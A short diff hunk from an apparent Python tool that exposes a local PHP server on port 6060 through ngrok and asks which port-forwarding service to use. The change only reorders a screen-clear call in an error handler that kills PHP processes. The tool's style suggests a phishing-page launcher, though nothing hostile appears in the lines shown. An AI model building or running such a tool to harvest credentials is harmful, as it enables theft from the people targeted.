@@ -552,9 +552,9 @@ exit();""")
           print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
           print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
        except:
+          os.system("clear")
           with open("exit","w") as kill:
              Popen(("taskkill","/F","/IM","php*"),stderr=kill,stdout=kill)
-          os.system("clear")
           sys.exit()
     
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
